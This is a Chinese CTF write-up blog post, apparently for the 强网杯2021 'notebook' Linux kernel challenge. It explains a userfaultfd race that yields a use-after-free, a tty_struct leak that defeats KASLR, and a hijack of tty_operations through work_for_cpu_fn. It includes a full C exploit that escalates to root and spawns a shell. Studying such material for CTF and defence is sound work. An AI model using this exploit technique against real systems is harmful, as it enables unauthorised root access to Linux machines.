+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_t</span> monitor_uffd;<br>uffd_buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>Userfaultfd_Exploit(&amp;monitor_uffd, uffd_buf, <span class="hljs-number">0x1000</span>);<br></code></pre></td></tr></table></figure>
+
+<h1 id="例题解析"><a href="#例题解析" class="headerlink" title="例题解析"></a>例题解析</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>启动脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">stty</span> intr ^]<br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -m 512M \<br>    -kernel bzImage \<br>    -initrd core.cpio \<br>    -append <span class="hljs-string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>    -nographic \<br>    -net user \<br>    -net nic \<br>    -device e1000 \<br>    -smp cores=2,threads=2 \<br>    -cpu kvm64,+smep,+smap \<br>    -monitor /dev/null 2&gt;/dev/null \<br>    -s<br></code></pre></td></tr></table></figure>
+
+<p>稍微修改了下，出题人给的太阴间了（🔨</p>
+<p>保护机制是<code>smep</code> <code>smap</code>  <code>kaslr</code> ，然后两核四线程</p>
+<p>bss段上的三个全局变量</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%201.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>交互所需要的结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *ptr;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>菜单堆，功能还算全</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%202.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>同时存在读写堆块的功能</p>
+<p>读</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%203.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>写</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%204.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>add功能</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%205.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>存在读锁，可以多线程访问</p>
+<p>申请堆块的大小要≤ 0x60，然后会将name字段赋值，接着再申请堆块</p>
+<p>del功能</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%206.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>写锁，无法多线程访问</p>
+<p>正常的free流程，先free，如果size字段存在，那么就将置为0</p>
+<p>edit功能</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%207.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>读锁，可以多线程访问</p>
+<p>如果size与之前申请的相同，那么不发生任何操作</p>
+<p>如果与之前的不同，调用<code>krealloc</code> 更改大小，赋值name</p>
+<p>同时需要注意的是没有<strong>size检查，</strong>也就是说，这里的size可以任意更改</p>
+<p>gift</p>
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%208.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>将notebook的内容拷贝到用户态，意味着所有的分配的堆地址都是已知的</p>
+<p>add和edit功能存在读锁，可以多线程访问，因此可以尝试通过userfaultfd来构造uaf堆块。</p>
+<p>存在堆块读写，也就是说堆块的内容是可以控制的</p>
+<p>通过gift可以得到所有分配堆块的地址</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="构造uaf堆块"><a href="#构造uaf堆块" class="headerlink" title="构造uaf堆块"></a>构造uaf堆块</h3><p>当访问到一块存在缺页异常，且被uffd monitor监视的内存时，会触发到handler，通过sleep操作将handler线程卡住，从而实现条件竞争的效果</p>
+<p>edit功能是先进行<code>krealloc</code> ，在copy数据到name上，借助这个<code>copy_from_user</code> ，可以触发uffd</p>
+<p>也就说，如果我修改了size为0，那么就可以实现uaf的效果</p>
+<h3 id="泄露kernel-offset"><a href="#泄露kernel-offset" class="headerlink" title="泄露kernel offset"></a>泄露kernel offset</h3><p>因为开启了kaslr保护，所以需要泄露偏移量。</p>
+<p>这里使用的是<code>tty_struct</code> ，通过泄露<code>PTY_UNIX98_OPS</code>或者<code>PTM_UNIX98_OPS</code> </p>
+<p>泄露的时候需要使用到读堆块的功能，需要注意的是，无论读还是写堆块，都存在一个size的检查，所以还需要将uaf堆块的size修改成非0的值</p>
+<p>修改的方式也是使用uffd，可以留意到add函数里，先进行size的赋值，接着是copy_from_user，最后kmalloc。借助uffd，可以卡在copy_from_user处，这样也就不会将原本的堆块地址覆盖</p>
+<h3 id="修改tty-opeartions-劫持控制流work-for-cpu-fn"><a href="#修改tty-opeartions-劫持控制流work-for-cpu-fn" class="headerlink" title="修改tty_opeartions 劫持控制流work_for_cpu_fn"></a>修改tty_opeartions 劫持控制流work_for_cpu_fn</h3><blockquote>
+<p>work_for_cpu_fn利用方式的成因后补….</p>
+</blockquote>
+<p>上面构造了一个uaf object，所以可以通过打开<code>/dev/ptmx</code>来获取这个object。接着在申请一个堆块，用于伪造tty_ops，然后通过gift泄露这两个堆的地址，通过读写功能修改数据，将tty_struct的tty_operations修改成提前布置好的tty_ops，下面就是布置rop链，最后提权，拿shell</p>
+<p>work_for_cpu_fn利用方式简单的说，tty_ops调用函数时，参数一般都是tty_struct的地址，也就是rdi&#x3D;&amp;tty_struct</p>
+<p>这里将tty_ops.ioctl修改成work_for_cpu_fn</p>
+<p>将需要调用的函数写于<code>rdi+0x20</code>处</p>
+<p>将需要设置的参数写于<code>rdi+0x28</code>处</p>
+<p>将调用后的返回结果写于<code>rdi+0x30</code>处</p>
+<p>这样可以写成一个简单的rop链，常见的提权手段就是<code>commit_creds(prepare_kernel_cred(NULL))</code></p>
+<p>所以可以分批次写，先执行内层的函数<code>prepare_kernel_cred(NULL)</code> 接着执行外层….</p>
+<p>不考虑KPTI绕过的原因：因为此时在内核的页表上执行system，不需要进行切换页表</p>
+<p>执行完毕后内核已经提权成功，接着需要开一个root sh，记得将tty_struct的内容还原，不然会panic</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>可以通过注释掉debug函数中的getchar()，来调试，自用（<del>👴觉得好用就是好用</del></p>
+<p>编译指令<code>gcc exp.c -static -masm=intel -g -o exp -lpthread</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../../template/kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">/ # cat /proc/kallsyms | grep &quot;pty_unix98_ops&quot;</span><br><span class="hljs-comment">ffffffff81e8e320 r pty_unix98_ops</span><br><span class="hljs-comment">/ # cat /proc/kallsyms | grep &quot;ptm_unix98_ops&quot;</span><br><span class="hljs-comment">ffffffff81e8e440 r ptm_unix98_ops</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">sem_t</span> add_sem, edit_sem;<br><span class="hljs-type">char</span> *uffd_buf;<br><span class="hljs-type">char</span> tmp[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-string">&quot;flyyy&quot;</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] %s\n&quot;</span>,msg);<br>    <span class="hljs-comment">// getchar();</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">void</span> *ptr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">knode</span>&#123;</span><br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">size_t</span> size;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteread</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    read(fd, ptr, idx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">notewrite</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    write(fd, ptr, idx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .ptr = ptr,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x100</span>,&amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .ptr = ptr,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x200</span>,&amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .ptr = ptr,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x300</span>,&amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *ptr)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .ptr = ptr,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0x64</span>,&amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">evil_add</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;<br>    <span class="hljs-type">char</span> *output = (<span class="hljs-type">char</span> *)arg;<br>    sem_wait(&amp;add_sem);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] evil %s done!\n&quot;</span>,output);<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>&#123;<br>    <span class="hljs-type">char</span> *output = (<span class="hljs-type">char</span> *)arg;<br>    sem_wait(&amp;edit_sem);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] evil %s done!\n&quot;</span>,output);<br>    edit(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwn</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> orig_tty_struct_data[<span class="hljs-number">0x2e0</span>],fake_tty_struct_data[<span class="hljs-number">0x2e0</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> <span class="hljs-title">fake_tty_ops</span>;</span><br><br>    sem_init(&amp;add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/*注册userfaultfd*/</span><br>    <span class="hljs-type">pthread_t</span> monitor_uffd;<br>    uffd_buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    Userfaultfd_Exploit(&amp;monitor_uffd, uffd_buf, <span class="hljs-number">0x1000</span>);<br><br>    debug(<span class="hljs-string">&quot;register uffd&quot;</span>);<br><br>    <span class="hljs-comment">/*通过edit，申请到0x2e0大小的slab*/</span><br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,tmp);<br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x2e0</span>,tmp);<br>    debug(<span class="hljs-string">&quot;krealloc 0x2e0&quot;</span>);<br><br>    <span class="hljs-comment">/*利用uffd机制，实现uaf*/</span><br>    <span class="hljs-type">pthread_t</span> fix_size,uaf;<br>    pthread_create(&amp;fix_size, <span class="hljs-literal">NULL</span>, evil_add, <span class="hljs-string">&quot;add&quot;</span>);<br>    pthread_create(&amp;uaf, <span class="hljs-literal">NULL</span>, evil_edit, <span class="hljs-string">&quot;edit&quot;</span>);<br><br>    <span class="hljs-comment">/*uaf具体实现，通过krealloc(0)，接着修改size，从而绕过检查*/</span><br>    sem_post(&amp;edit_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    sem_post(&amp;add_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    debug(<span class="hljs-string">&quot;evil action&quot;</span>);<br>    <br>    <span class="hljs-comment">/*申请结构体到tty结构体*/</span><br>    <span class="hljs-type">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    debug(<span class="hljs-string">&quot;hijack tty_struct&quot;</span>);<br><br>    noteread(<span class="hljs-number">0</span>,orig_tty_struct_data);<br><br>    <span class="hljs-type">size_t</span> tty_ops = orig_tty_struct_data[<span class="hljs-number">3</span>];<br><br>    <span class="hljs-keyword">if</span> ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>))&#123;<br>        kernel_offset = tty_ops - PTY_UNIX98_OPS;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        kernel_offset = tty_ops - PTM_UNIX98_OPS;<br>    &#125;<br><br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel base: 0x%lx\n&quot;</span>,kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] orig_tty_struct_data addr: 0x%lx\n&quot;</span>, &amp;orig_tty_struct_data);<br>    debug(<span class="hljs-string">&quot;forge fake_tty_op.ioctl&quot;</span>);<br><br>    fake_tty_ops.ioctl = WORK_FOR_CPU_FN + kernel_offset;<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>,tmp);<br>    edit(<span class="hljs-number">1</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations),tmp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] tty_operations address: 0x%lx size: 0x%lx\n&quot;</span>,&amp;fake_tty_ops,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations));<br><br>    notewrite(<span class="hljs-number">1</span>,&amp;fake_tty_ops);<br><br>    <span class="hljs-comment">// debug(&quot;&quot;)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">knode</span> <span class="hljs-title">k</span>[0<span class="hljs-title">x10</span>];</span><br>    <span class="hljs-type">size_t</span> fake_tty_struct_data_addr, fake_tty_ops_addr;<br>    gift(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] k addr 0x%lx\n&quot;</span>,&amp;k);<br><br>    fake_tty_struct_data_addr = k[<span class="hljs-number">0</span>].ptr;<br>    fake_tty_ops_addr = k[<span class="hljs-number">1</span>].ptr;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] fake_tty_struct_data_addr: 0x%lx\n&quot;</span>,fake_tty_struct_data_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] fake_tty_ops_addr: 0x%lx\n&quot;</span>,fake_tty_ops_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] fake_tty_struct_data: 0x%lx\n&quot;</span>,&amp;fake_tty_struct_data);<br><br>    <span class="hljs-comment">/* exec prepare_kernel_cred */</span><br>    debug(<span class="hljs-string">&quot;exec prepare_kernel_cred&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data,orig_tty_struct_data,<span class="hljs-number">0x2e0</span>);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = PREPARE_KERNEL_CRED + kernel_offset;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br><br>    notewrite(<span class="hljs-number">0</span>,fake_tty_struct_data);<br>    ioctl(fd_tty,<span class="hljs-number">111</span>,<span class="hljs-number">111</span>);<br><br>    <span class="hljs-comment">/* exec commit_creds */</span><br>    debug(<span class="hljs-string">&quot;exec commit_creds&quot;</span>);<br>    noteread(<span class="hljs-number">0</span>,fake_tty_struct_data);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = COMMIT_CREDS + kernel_offset;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = fake_tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">6</span>] = orig_tty_struct_data[<span class="hljs-number">6</span>];<br><br>    notewrite(<span class="hljs-number">0</span>,fake_tty_struct_data);<br>    ioctl(fd_tty,<span class="hljs-number">111</span>,<span class="hljs-number">111</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to change to root\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    debug(<span class="hljs-string">&quot;root...&quot;</span>);<br>    notewrite(<span class="hljs-number">0</span>,orig_tty_struct_data);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Pwned by flyyy\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    pwn();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/blog_img/%E5%BC%BA%E7%BD%91%E6%9D%AF2021_notebook/image%209.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel-pwn/" class="print-no-link">#kernel pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>强网杯2021 notebook</div>
+      <div>http://example.com/2024/08/20/强网杯2021_notebook/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>flyyy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/12/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2mmsg/" title="巅峰极客2023 mmsg">
+                        <span class="hidden-mobile">巅峰极客2023 mmsg</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
